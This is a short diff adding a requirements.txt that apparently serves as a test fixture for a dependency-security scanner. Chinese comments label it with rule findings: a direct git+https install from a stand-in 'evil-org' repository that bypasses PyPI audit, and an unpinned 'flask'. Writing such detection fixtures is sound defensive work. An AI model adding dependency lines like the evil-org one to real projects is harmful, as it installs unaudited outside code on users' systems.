@@ -1,0 +1,5 @@
+requests==2.31.0
+# ← PYS-001: git+https 直接依赖（绕过 PyPI 审计）
+-e git+https://github.com/evil-org/toolkit.git#egg=toolkit
+# ← SUP-003: 未锁定版本
+flask
